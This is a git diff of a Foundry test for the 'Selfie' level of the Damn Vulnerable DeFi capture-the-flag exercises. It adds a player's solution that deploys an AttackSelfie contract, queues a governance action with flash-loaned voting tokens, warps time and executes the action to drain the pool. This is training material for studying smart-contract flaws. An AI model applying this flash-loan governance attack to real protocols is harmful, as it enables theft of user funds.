@@ -6,6 +6,7 @@ import {Test, console} from "forge-std/Test.sol";
 import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
 import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
 import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
+import {AttackSelfie} from "./AttackSelfie.sol";
 
 contract SelfieChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -62,7 +63,13 @@ contract SelfieChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_selfie() public checkSolvedByPlayer {
-        
+        //? completed on my own
+        // need to take flash loan , when i have tokens pass a governance to withdraw tokens
+        AttackSelfie attack = new AttackSelfie(token, governance, pool, recovery);
+        (bool success, uint256 actionId) = attack.attackPlan();
+        require(success, "Attack failed");
+        vm.warp(3 days);
+        governance.executeAction(actionId);
     }
 
     /**
